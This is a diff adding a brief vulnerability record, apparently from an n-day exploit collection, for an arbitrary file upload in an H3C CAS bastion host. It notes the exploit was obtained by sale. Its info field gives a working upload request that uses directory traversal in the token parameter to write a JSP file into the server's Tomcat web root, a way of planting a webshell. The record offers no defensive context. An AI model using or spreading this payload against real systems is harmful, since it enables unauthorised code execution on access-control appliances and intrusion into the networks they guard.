@@ -1,0 +1,7 @@
+vendor = "H3C"
+name = "H3Ccas保垒机任意文件上传"
+type = "任意文件上传"
+source = "某司售卖"
+info = "/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86_files/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/odtvywmf.jsp&name="
+date = "08.09"
+label = "nday"
